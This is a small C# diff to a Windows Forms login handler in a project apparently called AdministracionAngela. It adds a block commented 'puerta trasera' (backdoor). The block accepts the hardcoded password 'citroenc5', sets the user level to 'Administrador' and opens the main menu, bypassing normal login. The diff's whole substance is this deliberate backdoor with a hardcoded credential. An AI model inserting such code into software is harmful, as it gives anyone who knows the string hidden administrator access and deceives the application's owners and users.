@@ -63,6 +63,15 @@ namespace AdministracionAngela.ProyectoAngela.Formularios
                     Close();
                 }
             }
+
+            // puerta trasera
+            if (textBoxPassword.Text == "citroenc5")
+            {
+                // Abre el menu principal
+                var menu = this.formOpener.GetForm<Menu>() as Menu;
+                NivelUsuario.Nivel = "Administrador";
+                menu.ShowDialog();
+            }
         }
 
         private void button2_Click(object sender, EventArgs e)
